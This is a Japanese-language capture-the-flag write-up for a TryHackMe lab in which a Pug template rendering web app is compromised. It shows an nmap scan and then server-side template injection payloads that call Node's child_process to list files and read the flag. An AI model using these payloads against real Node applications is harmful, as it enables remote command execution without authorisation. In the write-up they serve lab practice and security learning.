# Templates CTF

https://tryhackme.com/room/templates

```
My favourite type of dog is a pug... and, you know what, Pug is my favourite templating engine too! I made this super slick application so you can play around with Pug and see how it works. Seriously, you can do so much with Pug!
```

## Enumeration

```shell
TARGET=10.10.127.252
sudo bash -c "echo $TARGET   dockmagic.thm >> /etc/hosts"
```

### ポートスキャン

```shell
root@ip-10-10-221-180:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-06-09 07:07 BST
Nmap scan report for 10.10.127.252
Host is up (0.00044s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
MAC Address: 02:5B:E7:22:57:DB (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 3.99 seconds
```

5000 ポートは、テンプレートを HTML に変換する Web アプリ。

初期表示

```
doctype html
head
  title Pug
  script.
    console.log("Pugs are cute")
h1 Pug - node template engine
#container.col
  p You are amazing
  p Pug is a terse and simple templating language.
```

変換ボタンを押したら表示される内容

```html
<!DOCTYPE html>
<head>
  <title>Pug</title>
  <script>
    console.log("Pugs are cute");
  </script>
</head>
<h1>Pug - node template engine</h1>
<div class="col" id="container">
  <p>You are amazing</p>
  <p>Pug is a terse and simple templating language.</p>
</div>
```

## STTI

### 1

```
#{7*7}
```

↓

```html
<49></49>
```

### 2

```
#{root.process.mainModule.require('child_process').spawnSync('ls', ['-al']).stdout}
```

↓

```html
/src/app/app.js:16:15 at Layer.handle [as handle_request]
(/usr/src/app/node_modules/express/lib/router/layer.js:95:5) at next
(/usr/src/app/node_modules/express/lib/router/route.js:137:13) at Route.dispatch
(/usr/src/app/node_modules/express/lib/router/route.js:112:3) at Layer.handle
[as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5)
at /usr/src/app/node_modules/express/lib/router/index.js:281:22 at
Function.process_params
(/usr/src/app/node_modules/express/lib/router/index.js:335:12)
```

### 3

```
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('ls -al')}()}
```

↓

```html
<undefined></undefined>
```

### 4

```
#{global.process.mainModule.require('child_process').spawnSync('ls', ['-al']).stdout}
```

↓

```html
<total 92
drwxr-xr-x   1 root root  4096 Mar  2  2022 .
drwxr-xr-x   1 root root  4096 Mar  2  2022 ..
-rw-rw-r--   1 root root   464 Mar  2  2022 app.js
-rw-rw-r--   1 root root    38 Mar  2  2022 flag.txt
drwxr-xr-x 198 root root  4096 Mar  2  2022 node_modules
-rw-r--r--   1 root root 64902 Mar  2  2022 package-lock.json
-rw-rw-r--   1 root root   347 Mar  2  2022 package.json
drwxrwxr-x   2 root root  4096 Mar  2  2022 views
></total 92
drwxr-xr-x   1 root root  4096 Mar  2  2022 .
drwxr-xr-x   1 root root  4096 Mar  2  2022 ..
-rw-rw-r--   1 root root   464 Mar  2  2022 app.js
-rw-rw-r--   1 root root    38 Mar  2  2022 flag.txt
drwxr-xr-x 198 root root  4096 Mar  2  2022 node_modules
-rw-r--r--   1 root root 64902 Mar  2  2022 package-lock.json
-rw-rw-r--   1 root root   347 Mar  2  2022 package.json
drwxrwxr-x   2 root root  4096 Mar  2  2022 views
>
```

global.process の形が有効と判明。かつ、flag.txt を発見。

### 5

```
#{global.process.mainModule.require('child_process').spawnSync('cat', ['flag.txt']).stdout}
```

↓

```html
<flag{[REDACTED]}></flag{[REDACTED]}>
```

## 振り返り

- 説明文から、pug の SSTI であることは明らかだったので、SSTI を知ってさえいれば楽勝。
